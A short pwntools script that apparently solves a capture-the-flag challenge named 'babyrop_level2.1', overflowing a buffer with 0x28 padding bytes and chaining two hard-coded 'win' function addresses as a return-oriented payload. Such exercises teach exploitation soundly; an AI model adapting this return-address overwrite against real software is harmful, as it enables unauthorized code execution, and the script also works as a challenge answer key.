from pwn import * 

elf = ELF("/challenge/babyrop_level2.1")
io = elf.process()

win_add1 = p64(int("401f9c", 16))
win_add2 = p64(int("402049", 16))

buff_offset = int("28", 16)

p = b'A'*(buff_offset) + win_add1 + win_add2

io.sendline(p)

io.interactive()
